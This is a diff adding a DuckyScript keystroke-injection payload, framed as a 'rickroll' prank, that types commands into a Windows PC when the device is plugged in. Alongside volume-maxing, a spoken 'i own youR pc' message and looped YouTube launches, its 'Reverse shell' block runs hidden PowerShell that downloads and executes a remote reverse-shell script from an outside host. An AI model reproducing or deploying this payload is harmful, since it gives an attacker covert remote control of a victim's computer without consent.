@@ -1,0 +1,83 @@
+REM This is a code for rickrolling people by hacker mozzabot
+
+DELAY 2000
+ATTACKMODE HID
+VAR $FOO
+ALT f4
+DELAY 200
+GUI r
+DELAY 200
+
+REM Reverse shell
+STRING powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+DELAY 200
+GUI d
+DELAY 100
+
+REM IDK
+GUI r
+DELAY 300
+STRING notepad
+DELAY 200
+ENTER
+DELAY 200
+STRING MOZZABOT
+DELAY 300
+ALT f4
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 200
+
+REM Speaking
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 200
+STRING $key=[Math]::Ceiling(100/2);$obj=New-Object -ComObject WScript.Shell;for($i=0;$i -lt $key;$i++){$obj.SendKeys([char] 175)}
+ENTER
+DELAY 500
+STRING $sp=New-Object -ComObject SAPI.SpVoice
+ENTER
+DELAY 500
+STRING $sp.Speak("i own youR pc")
+ENTER
+GUI f8
+DELAY 200
+STRING exit
+ENTER
+
+REM RickRoll
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 200
+STRING start https://www.youtube.com/watch?v=xvFZjo5PgG0
+ENTER
+
+REM 
+$FOO = ( $FOO + 1 )
+ATTACKMODE STORAGE
+
+REM Loop
+WHILE ( %FOO == 1 )
+	%FOO = ( %FOO + 1 )
+	IF ( %FOO == 2 ) THEN
+		LED_G
+		DELAY 20
+		LED_OFF
+		DELAY 20
+		%FOO = ( %FOO + 5 )
+	ELSE_IF ( %FOO == 100 ) THEN
+		LED_OFF
+		STRING powershell -windowstyle hidden
+		ENTER
+		DELAY 200
+		STRING start chrome https://www.youtube.com/watch?v=xvFZjo5PgG0
+		ENTER
+		$FOO = 0
+	END_IF
+END_WHILE
